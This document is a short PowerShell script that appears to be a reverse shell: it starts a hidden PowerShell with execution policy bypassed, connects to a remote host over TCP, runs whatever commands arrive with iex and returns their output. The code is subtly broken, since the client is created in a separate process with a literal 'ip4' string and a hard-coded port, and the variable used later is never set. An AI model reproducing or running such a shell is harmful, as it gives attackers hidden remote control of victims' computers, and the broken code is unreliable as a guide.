
param (
	[Parameter(Mandatory)]$ip4,
	[Parameter(Mandatory)]$port
)

function main {
	
	param (
		[Parameter(Mandatory)][string] $ip,
		[Parameter(Mandatory)][int] $port
	)

	powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ip4",1234); 
	$stream = $client.GetStream();
	[byte[]]$bytes = 0..65535 | %{0};

	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;
		$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
		$sendback = (iex $data 2>&1 | Out-String );
		$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
		$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
		$stream.Write($sendbyte,0,$sendbyte.Length);
		$stream.Flush()
	};
	$client.Close()
}

main -ip $ip4 -port $port


